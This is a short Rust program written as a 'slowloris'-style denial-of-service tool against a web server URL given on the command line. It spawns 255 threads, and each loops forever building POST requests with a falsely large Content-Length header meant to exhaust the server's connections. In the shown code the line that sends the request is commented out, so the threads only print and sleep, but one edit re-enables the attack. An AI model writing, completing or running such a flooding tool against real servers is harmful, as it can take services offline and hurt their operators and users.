use std::thread;
use std::env;
use std::time::Duration;
extern crate curl;
use curl::easy::{Easy, List};

static WORKERS: i32 = 255;

fn main() {

    let mut minions = vec![];
    let args: Vec<String> = env::args().collect();

    // TODO: Handle the case where no argument is passed.
    let target_url: String = args[1].clone();

    println!("Target: {}", target_url);

    for i in 0..WORKERS {

        // We need to copy the target_url here because curl needs a mutable
        // reference, and we can't give the same mutable reference to several
        // threads.
        let inner_url = target_url.clone();

        minions.push(thread::spawn(move || {
            loop {
                // An instance of curl.
                let mut curl = Easy::new();
                curl.url(&inner_url).unwrap();

                // A list to hold the headers we'll send. That's straight from
                // the example at https://github.com/alexcrichton/curl-rust
                let mut headers = List::new();

                headers.append("User-Agent: slowloris").unwrap();
                // Here's the trick - slowloris tells the server that it's
                // posting really big content.
                headers.append("Content-Type: application/x-www-form-urlencoded").unwrap();
                headers.append("Content-Length: 1000000").unwrap();
                curl.http_headers(headers).unwrap();

                // Tell curl it's a post.
                curl.post(true).unwrap();
                println!("Performing POST to {} from minion {}", inner_url ,i);
                // Actually send the request
                //curl.perform().unwrap();
                thread::sleep(Duration::from_millis(1000));
            }
        }));
    }

    for minion in minions {
        let _ = minion.join();
    }
}
